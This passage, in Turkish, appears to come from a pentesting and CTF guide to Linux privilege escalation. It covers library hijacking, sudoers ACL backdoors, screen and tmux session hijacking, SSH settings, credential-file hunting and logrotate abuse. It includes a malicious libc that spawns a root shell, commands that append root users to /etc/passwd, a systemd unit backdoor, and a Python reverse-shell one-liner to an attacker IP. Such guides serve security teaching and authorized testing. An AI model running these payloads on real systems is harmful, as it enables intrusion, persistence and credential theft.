 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Ardından `/var/tmp` içinde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` komutuyla kötü amaçlı bir kütüphane oluşturun.

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities, **mevcut root ayrıcalıklarının bir alt kümesini bir sürece sağlar**. Bu, root **ayrıcalıklarını daha küçük ve birbirinden farklı birimlere** ayırır. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Böylece ayrıcalıkların tamamı azaltılarak istismar riskleri düşürülür.\
Capabilities ve bunların nasıl kötüye kullanılabileceği hakkında **daha fazla bilgi edinmek** için aşağıdaki sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde **"execute" biti**, etkilenen kullanıcının klasöre "**cd**" yapabileceği anlamına gelir.\
**"read" biti**, kullanıcının **dosyaları listeleyebileceği**; **"write" biti** ise yeni **dosyalar oluşturup** mevcut **dosyaları silebileceği** anlamına gelir.

## ACLs

Access Control Lists (ACLs), **geleneksel ugo/rwx izinlerini geçersiz kılabilen**, isteğe bağlı izinlerin ikincil katmanını temsil eder. Bu izinler, dosya veya dizin erişimini iyileştirerek sahip olmayan ya da grubun parçası olmayan belirli kullanıcılara haklar verilmesine veya bu hakların reddedilmesine olanak tanır. Bu **ayrıntı düzeyi, erişimin daha hassas biçimde yönetilmesini sağlar**. Daha fazla bilgiye [**buradan**](https://linuxconfig.org/how-to-manage-acls-on-linux) ulaşabilirsiniz.<sup>[[19]](#references)</sup>

"kali" kullanıcısına bir dosya üzerinde okuma ve yazma izinleri **verin**:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Sistemden belirli ACL'lere sahip dosyaları alın:**

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-in dosyalarında gizli ACL arka kapısı

Yaygın bir yanlış yapılandırma, `/etc/sudoers.d/` içinde `440` izinlerine sahip, root tarafından sahiplenilen ancak ACL aracılığıyla düşük ayrıcalıklı bir kullanıcıya yazma erişimi veren bir dosyadır.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

`user:alice:rw-` gibi bir şey görürseniz, kullanıcı kısıtlayıcı mode bitlerine rağmen bir sudo kuralı ekleyebilir:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Bu, yüksek etkili bir ACL persistence/privesc yoludur; çünkü yalnızca `ls -l` kullanılarak yapılan incelemelerde kolayca gözden kaçabilir.

## Açık shell oturumları

Kullanıcılar arası GNU Screen erişimi yalnızca sürüme değil, **çalışan oturumun yapılandırmasına ve ACL'sine** bağlıdır. [GNU Screen documents](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html), programın multiuser desteğiyle derlenmiş olması gerektiğini; `multiuser on` ve bir `acladd` veya uygun bir `aclchg` izninin başka bir kullanıcının oturuma attach olmasına izin verdiğini belirtir. [The manual also requires setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html), kullanıcılar arası oturum araması için setuid-root gerektiğini de belirtir. Görünür, root sahipliğindeki bir socket veya tek başına SUID `screen` binary'si, root shell'e attach olunabileceğini kanıtlamaz. Bunu bir yetki yükseltme yolu olarak değerlendirmeden önce canlı oturumun multiuser olduğunu, mevcut kullanıcının etkin girdi/komut iznine sahip olduğunu ve oturumdaki shell'in ayrıcalıklı kullanıcı olarak çalıştığını doğrulayın.

### screen sessions hijacking

**Screen oturumlarını listeleme**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen oturumlarının ele geçirilmesi - Socket konumları (bazı sistemlerde biri diğerinin symlink'i olarak sunulur): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Bir oturuma bağlan**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Bu, **eski tmux sürümlerinde** görülen bir sorundu. Root tarafından oluşturulmuş bir tmux (v2.1) oturumunu ayrıcalıksız bir kullanıcı olarak ele geçiremedim.

**tmux oturumlarını listeleme**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Soket konumları (bazı sistemlerde biri diğerinin sembolik bağlantısı olarak sunulur) - tmux oturumlarının ele geçirilmesi: tmux -S /tmp/dev sess ls Bu soketi kullanarak listeleyin; bu sokette bir tmux oturumu başlatabilirsiniz...](<../../images/image (837).png>)

**Bir oturuma bağlan**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

**HTB'deki Valentine box**'ı örnek olarak inceleyin.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Tarihsel olarak güvenlik açığı bulunan dönemde etkilenen Debian veya türevi OpenSSL derlemeleriyle oluşturulmuş anahtarların rastgeleliği tahmin edilebilir olabilir; ana bilgisayarın mevcut dağıtımı veya yamalanmış OpenSSL sürümü, eski bir anahtarın nasıl oluşturulduğunu göstermez. **Belirli anahtarı** uygun bir tarihsel kara listeye ve anahtarın kökenine göre kontrol edin. Debian'ın [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) belgesi, açık anahtarların ve `authorized_keys` dosyalarının kontrol edilmesini açıklar; [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) ise OpenSSL düzeltmesini kaydeder. Ayrıcalıklı bir hesabın `authorized_keys` dosyasındaki bir kayıt, yalnızca eşleşen özel anahtar elde edilebiliyorsa ve etkin SSH ilkesi bu anahtarın söz konusu hesap için kullanılmasına hâlâ izin veriyorsa ayrıcalık yükseltme ipucudur; zayıf bir **host** anahtarı tek başına oturum açma kimlik bilgisi değildir. Ele geçirilmiş anahtarları değiştirin ve eski yetkilendirmelerini kaldırın.

### SSH ilginç yapılandırma değerleri

- **PasswordAuthentication:** Parola kimlik doğrulamasına izin verilip verilmediğini belirtir. Upstream OpenSSH varsayılanı `yes` değeridir; dağıtım yapılandırması bunu geçersiz kılabilir.
- **PubkeyAuthentication:** Açık anahtar kimlik doğrulamasına izin verilip verilmediğini belirtir. Varsayılanı `yes` değeridir.
- **PermitEmptyPasswords**: Parola kimlik doğrulamasına izin verildiğinde, sunucunun parola dizeleri boş olan hesaplara giriş izni verip vermediğini belirtir. Varsayılanı `no` değeridir.

### Oturum açma denetim dosyaları

Bu dosyalar kimin, nasıl oturum açabileceğini etkiler:

- **`/etc/nologin`**: varsa, root dışındaki kullanıcıların oturum açmasını engeller ve içindeki mesajı gösterir.
- **`/etc/securetty`**: root kullanıcısının hangi yerlerden oturum açabileceğini sınırlar (TTY izin listesi).
- **`/etc/motd`**: oturum açtıktan sonra gösterilen banner (ortam veya bakım ayrıntılarını sızdırabilir).

### PermitRootLogin

Root kullanıcısının ssh kullanarak oturum açıp açamayacağını belirtir. Upstream OpenSSH varsayılanı `prohibit-password` değeridir; dağıtım yapılandırması bunu geçersiz kılabilir. Olası değerler:

- `yes`: root, parola ve özel anahtar kullanarak oturum açabilir
- `without-password` veya `prohibit-password`: root yalnızca özel anahtarla oturum açabilir
- `forced-commands-only`: Root yalnızca özel anahtar kullanarak ve `commands` seçenekleri belirtilmişse oturum açabilir
- `no` : oturum açamaz

### Güvenilen SSH kullanıcı sertifikası yetkilileri

`TrustedUserCAKeys`, sshd'nin **kullanıcı** sertifikalarını imzalamak için güvendiği açık anahtarları belirtir. İlgili özel CA anahtarı daha düşük ayrıcalıklı bir kullanıcı tarafından okunabiliyorsa, kimin sertifika alabileceğini ve sertifikanın hangi hesaplarda kimlik doğrulaması yapabileceğini inceleyin. `AuthorizedPrincipalsFile` veya `AuthorizedPrincipalsCommand` kabul edilen adları kısıtlayabilir; bunların hiçbiri yapılandırılmadığında sertifika hedef hesap adını içermelidir. `PermitRootLogin prohibit-password`, root için parola kimlik doğrulamasını engeller ancak sertifika kimlik doğrulamasına yine de izin verebilir. Bir anahtar yolunun açığa çıkması tek başına erişimi kanıtlamaz: açık/özel anahtar çiftini, etkin `Match` kurallarını, hesap ilkesini, anahtar parolasını, iptal durumunu ve kabul edilen imza algoritmalarını doğrulayın. Özel anahtar baytlarını enumeration çıktısına eklemeyin. [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys) belgesine bakın.

Bir ayrıcalık devri kuralı, kullanıcının anahtar sahibinin kimliğiyle kısıtlanmamış bir [sertifika imzalayıcıyı, örneğin `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), çalıştırmasına izin veriyorsa özel CA anahtarı mevcut kullanıcı tarafından **okunamasa bile** kullanılabilir olabilir. İzin verilen tam komutu ve argümanları; imzalayan hesabın anahtara erişimi, etkin sshd yapılandırmasının güvendiği açık CA anahtarı, hedef hesap için kabul edilen principal, sertifikanın geçerliliği ve o hesabın oturum açma ilkesiyle birlikte değerlendirin. Yetkilendirilmiş bir imzalayıcı komutu veya güvenilen bir CA dosyası tek başına başka bir hesaba erişimi kanıtlamaz; pasif enumeration sırasında test sertifikası imzalamayın.

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek açık anahtarları içeren dosyaları belirtir. Ana dizinle değiştirilen `%h` gibi token'lar içerebilir. **Mutlak yollar** (`/` ile başlayan) veya **kullanıcının ana dizinine göreli yollar** belirtebilirsiniz. Örneğin:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Bu yapılandırma, **testusername** kullanıcısının **private** key’iyle oturum açmaya çalıştığınızda ssh’in anahtarınızın public key’ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` konumlarındakilerle karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, anahtarları (passphrase olmadan!) sunucunuzda bırakmak yerine **yerel SSH anahtarlarınızı kullanmanıza** olanak tanır. Böylece ssh ile **bir sunucuya atlayabilir** ve oradan **başka bir sunucuya**, **ilk sunucunuzda** bulunan **anahtarı kullanarak** atlayabilirsiniz.

Bu seçeneği `$HOME/.ssh.config` dosyasında şu şekilde ayarlamanız gerekir:

```
Host example.com
  ForwardAgent yes
```

`Host` her seferinde kullanıcı farklı bir makineye geçtiğinde `*` ise, bu host anahtarlara erişebilir (bu bir güvenlik sorunudur).

`/etc/ssh_config` dosyası bu **seçenekleri** **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya vermeyebilir.\
`/etc/sshd_config` dosyası `AllowAgentForwarding` anahtar sözcüğüyle ssh-agent forwarding'e **izin verebilir** veya vermeyebilir (varsayılan olarak izin verilir).

Bir ortamda Forward Agent'ın yapılandırıldığını fark ederseniz, aşağıdaki sayfayı inceleyin; **yetki yükseltmek için bundan yararlanabilirsiniz**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profile dosyaları

`/etc/profile` dosyası ve `/etc/profile.d/` altındaki dosyalar, **kullanıcı yeni bir shell başlattığında çalıştırılan betiklerdir**. Bu nedenle, bunlardan herhangi birine **yazabilir veya dosyayı değiştirebilirseniz yetki yükseltebilirsiniz**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Herhangi bir şüpheli profile script bulunursa **hassas bilgiler** içerip içermediğini kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir ad kullanıyor olabilir veya yedekleri bulunabilir. Bu nedenle, dosyaların içinde **hash olup olmadığını** görmek için **hepsini bulmanız** ve **okuyup okuyamadığınızı kontrol etmeniz** önerilir:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyasında **parola hash'leri** bulabilirsiniz.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Ardından `hacker` kullanıcısını ekleyin ve oluşturulan parolayı girin.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Örn.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `hacker:hacker` ile `su` komutunu kullanabilirsiniz.

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: Makinenin mevcut güvenliğini azaltabilirsiniz.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOT: BSD platformlarında `/etc/passwd`, `/etc/pwd.db` ve `/etc/master.passwd` konumlarında bulunur; ayrıca `/etc/shadow` dosyasının adı `/etc/spwd.db` olarak değiştirilmiştir.

Bazı **hassas dosyalara yazıp yazamadığınızı** kontrol etmelisiniz. Örneğin, herhangi bir **servis yapılandırma dosyasına** yazabiliyor musunuz?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** şu satırları değiştirebilirsiniz:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Edin

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamazsınız ama deneyin)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Alışılmadık Konum/Sahip Olunan Dosyalar

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Son dakikalarda değiştirilen dosyalar

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB dosyaları

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Okunabilir uygulama veritabanlarında, kullanıcı adları ve parola hash'leri için tablo ve sütun adlarını inceleyin. Bir hash bulmak, parolasını kurtarmak ve yerel bir hesapta yeniden kullanıldığını kanıtlamak ayrı adımlardır; sıradan 32 karakterlik bir onaltılık dize, bunun MD5 olduğunu ya da hesaba erişim sağladığını çıkarsamak için yeterli değildir.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Okunabilir bir shell history içinde, `sudo` komutunun ardından parolaya benzeyen kısa bir satır varsa, çevresindeki satırları elle inceleyin. Normal `sudo` istemine girilen bir parola shell history'ye kaydedilmez; sonraki satır yalnızca yanlışlıkla shell'e girilmiş olabilecek bir girdidir, geçerli bir parolanın kanıtı değildir. `.sudo_as_admin_successful` işaretçisi, daha önce kullanıldığını kaydeder; mevcut yetkilendirmeyi göstermez.

### Gizli dosyalar

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH İçindeki Script/Binary'ler**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Web dosyaları**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Yedekler**

Yedekleme dizinlerindeki okunabilir dosyaları ve **adlarında** `backup` geçen dosyaları inceleyin: adı anlaşılmaz olan veya şifreli uzantıya sahip bir arşiv bile eski uygulama verilerini açığa çıkarabilir. Şifreli bir arşiv yalnızca olası bir veri ifşasıdır. Parolanın kurtarılması, içeriğinin incelenmesi, bir uygulama hash'inin kurtarılması ve bu parolanın bir Unix hesabında yeniden kullanılması ayrı ayrı doğrulanması gereken adımlardır; arşivdeki bir hash, yerel oturum açmanın mümkün olduğunu kanıtlamaz.

Okunabilir sanal makine yedekleri de aynı şekilde incelenmelidir. Bir VirtualBox `.vbox` yapılandırması, bağlı `.vdi` imajlarını belirleyebilir ve şifreli disk anahtarı meta verilerini içerebilir; [VirtualBox, şifreli veri anahtarının VM yapılandırmasında saklandığını belirtir](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Çevrimdışı disk incelemesi yapabilmek için hem yapılandırmaya hem de imaja erişilebilmelidir. Konuk işletim sistemindeki bir birim, ayrıca ayrı bir anahtar gerektiren kendi [LUKS şifreleme katmanına](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) sahip olabilir. Yetkili şekilde şifre çözme işleminden sonra bile eski betikler veya yapılandırmalar parola içerebilir; bunu yerel bir hesapta kullanılan güncel bir kimlik bilgisi olarak değerlendirmeden ve bu kimlik bilgisinin etkin `sudo` politikasının ayrıcalıklı bir komuta izin verdiğini doğrulamadan, durumu yerel bir yetki yükseltmesi olarak nitelendirmeyin. Pasif envanter çıkarma sırasında imajları kopyalamadan, şifrelerini çözmeden veya bağlamadan yolları ve izinleri listeleyin.

Okunabilir bir arşivi incelerken, herhangi bir şeyi çıkarmadan önce üye adlarını listeleyin: canlı kopyaları korumalı olsa bile gizli kimlik doğrulama dosyaları, kurtarma kodu verileri veya SSH anahtarları bulunabilir. Dosya adları yalnızca bir ipucu verir; veriyi ve hesaplar arasında yeniden kullanım olup olmadığını ayrıca doğrulayın.

Özellikle root sahibi olan ve grup üyeliği aracılığıyla erişilebilen arşivlere öncelik vererek, yedekleme dizinlerinde başka bir kullanıcıya ait **okunabilir arşivleri** inceleyin. Canlı kopya korumalı olsa bile eski bir arşivde yapılandırma veya kimlik doğrulama sırrı bulunabilir. [Backrest](https://garethgeorge.github.io/backrest/) gibi yerel bir yedekleme arayüzünde hizmetin etkin hesabını ve daha düşük ayrıcalıklı bir kullanıcının yapılandırmasını okuyup okuyamadığını veya arayüzde kimlik doğrulaması yapıp yapamadığını kontrol edin. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) ve [restic komut arayüzü](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto), daemon'ın dosya ve komut ayrıcalıklarıyla çalışabilir; yalnızca loopback adresini dinlemesi, etkinin ne olacağını belirlemez. Backrest'in `passwordBcrypt` değeri, [kimlik doğrulama kodunda](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go) bulunan base64 kodlu bir bcrypt hash'idir; düz metin parola değildir. Açığa çıkan bir arşivi veya arayüzü bir ayrıcalık sınırı olarak değerlendirmeden önce hizmet kimliğini, kullanılabilir kimlik bilgilerini ve ilgili plana ya da depoya erişimi doğrulayın.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Parola içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; **parola içerebilecek çeşitli dosyaları** arar.\
Bunu yapmak için kullanabileceğiniz **bir başka ilginç araç** da şudur: Windows, Linux ve Mac'te yerel bir bilgisayarda saklanan çok sayıda parolayı almak için kullanılan açık kaynaklı bir uygulama olan [**LaZagne**](https://github.com/AlessandroZ/LaZagne).

`/etc/guacamole/guacamole.properties` okunabiliyorsa `mysql-*`, `postgresql-*` veya `sqlserver-*` veritabanı bağlantı ayarlarını inceleyin. Hesabın Guacamole JDBC tablolarını okuma yetkisi varsa `guacamole_connection_parameter`, kayıtlı SSH `username`, `password`, `private-key` veya `passphrase` değerleri içerebilir. Bağlantı kimlikleri ve parametre adlarıyla başlayıp yalnızca ilgili satırları inceleyin; kayıtlı değer yeniden kullanılabilir bir sır yerine dinamik bir token veya kasa başvurusu olabilir. Bkz. [Guacamole JDBC şeması](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) ve [SSH bağlantı parametreleri](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[pswm parola yöneticisinin varsayılan veritabanı](https://github.com/Julynx/pswm#usage), varsayılan olarak `~/.local/share/pswm/pswm` konumunda şifrelenmiş bir kasa saklar. Başka bir kullanıcının kasası görünüyorsa sahipliğini ve hesabınızın kasayı gerçekten okuyup okuyamadığını kontrol edin. Kasa yolu tek başına kimlik bilgilerini açığa çıkarmaz; ana parolayı kurtarmak, yeniden kullanılabilir bir hesap parolası bulmak ve bu hesabın yetkilerini doğrulamak birbirinden ayrı adımlardır.

[Passpie'nin varsayılan veritabanı](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database), grup dizinleri altında `.keys` anahtarlığı ve şifrelenmiş `.pass` kimlik bilgisi dosyaları bulunan `~/.passpie/` dizinidir. Veritabanı dizininin görünür olması yalnızca bir yol ipucudur: anahtara ve ilgili şifrelenmiş kayda erişiminizi, gerekiyorsa ana parola ifadesini ve kurtarılan kimlik bilgisinin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Passpie ayrıca [özel veritabanı yollarını](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases) desteklediğinden varsayılan yol tüm olasılıkları kapsamaz. Otomatik enumeration, kimlik bilgilerini dışa aktarmadan veya anahtar materyalini yazdırmadan metadata listelemelidir.

### Günlükler

Günlükleri okuyabiliyorsanız, **içlerinde ilginç/gizli bilgiler** bulabilirsiniz. Günlük ne kadar tuhafsa o kadar ilginç olacaktır (muhtemelen).\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoor'lu?) **denetim günlükleri**, bu yazıda açıklandığı gibi **denetim günlüklerine parola kaydetmenize** olanak tanıyabilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Logları okumak için **grup** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) gerçekten faydalı olacaktır.

### Shell dosyaları

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generic Creds Search/Regex

Dosya **adında** veya **içeriğinde** "**password**" kelimesi geçen dosyaları da kontrol etmelisiniz. Ayrıca loglarda IP'leri ve e-posta adreslerini, hash regex'lerini de arayın.\
Bunların hepsini burada nasıl yapacağınızı anlatmayacağım; ancak ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Bir python script'inin **nerede** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** ya da python kütüphanelerini **değiştirebiliyorsanız**, OS kütüphanesini değiştirip ona backdoor ekleyebilirsiniz (python script'inin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

**Kütüphaneye backdoor eklemek** için os.py kütüphanesinin sonuna şu satırı eklemeniz yeterlidir (IP ve PORT'u değiştirin):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Logrotate exploitation

Ayrıcalıklı bir `logrotate` işi, yalnızca ayrıcalığı daha düşük bir kullanıcının döndürme sırasında değiştirebildiği veya yönlendirebildiği bir dizinin altındaki bir logu gerçekten döndürdüğünde, kullanıcılar arası dosya yazma yolu oluşturabilir. Tek başına yazılabilir bir log, yalnızca araştırmaya değer bir ipucudur. Etkin kuralı ve `create`, `olddir` ve `su` yönergelerini; zamanlayıcının etkin kimliğini; logun üst dizinindeki yazma ve arama izinlerini; ayrıca kurulu sürümün ve politikanın hedef değişikliğine izin verip vermediğini doğrulayın. Başlangıç dosyasına yazmanın komut yürütmeye dönüşmesi için, daha sonra ayrıcalıklı bir kabuğun oluşan dosyayı yüklemesi de gerekir. Döndürmeyi tetiklemeden veya yarışı denemeden zamanlamayı, kuralı, sürümü/paketlemeyi ve yol meta verilerini inceleyin.

> [!TIP]
> `3.18.0` sürümünü veya başka bir sürüm dizesini tek başına istismar edilebilirliğin eşiği olarak değerlendirmeyin. [Upstream değişiklik günlüğünde](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) birden fazla sürümdeki dizin ve symlink güvenlik iyileştirmeleri kayıtlıdır; dağıtımlar da düzeltmeleri geriye dönük olarak aktarabilir. [Upstream kılavuzu](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in), root ayrıcalığıyla ayrıcalıksız kullanıcıların kontrolündeki dizinlerdeki logları döndürürken `su` kullanılmasını önerir; etkin kuralı ve gerçek davranışı doğrulayın.

Güvenlik açığı hakkında daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile exploit edebilirsiniz.

Bu güvenlik açığı [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logları)** ile çok benzerdir; bu nedenle logları değiştirebildiğinizi fark ettiğinizde, bu logları kimin yönettiğini ve logları symlink’lerle değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Güvenlik açığı referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

